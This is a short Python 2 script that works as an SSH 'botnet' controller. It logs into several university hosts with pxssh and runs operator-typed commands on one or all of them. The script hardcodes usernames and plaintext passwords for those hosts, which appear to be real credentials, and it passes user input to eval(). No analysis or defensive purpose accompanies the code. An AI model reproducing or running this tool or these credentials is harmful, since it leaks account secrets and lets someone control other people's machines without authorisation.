import pxssh

class Client:
    def __init__(self, host, user, password):
        self.host= host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            print e
            print '[-] Error Connecting'

    def send_command (self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before
    
    def multi_command (self, cmd):
        for line in cmd.split("/"):
            self.session.sendline( line )
            self.session.prompt()

        return self.session.before
def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from ' +client.user + "@"+ client.host

        print '[+] ' + output

def botCommand(command, client):
    output =client.multi_command(command)
    print '[*] Output from ' +client.user + "@"+ client.host
    print '[+] ' + output



def addClient (host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

botNet=[]

addClient ('occs.cs.oberlin.edu', 'jmeltzer', 'FullBr!ght')
addClient ('occs.cs.oberlin.edu', 'kvail', 'vail2565')
addClient ('clyde.cs.oberlin.edu', 'jmeltzer', 'FullBr!ght')
command= raw_input("$")
while command != "\n":
    botNum=raw_input("Which bot (* for all)")
    if botNum == "*":
        botnetCommand(command)
    else:
        try:
            botCommand(command, botNet[eval(botNum)])
        except Exception, e:
            print e
            print '[-] Error'


    command = raw_input("$")


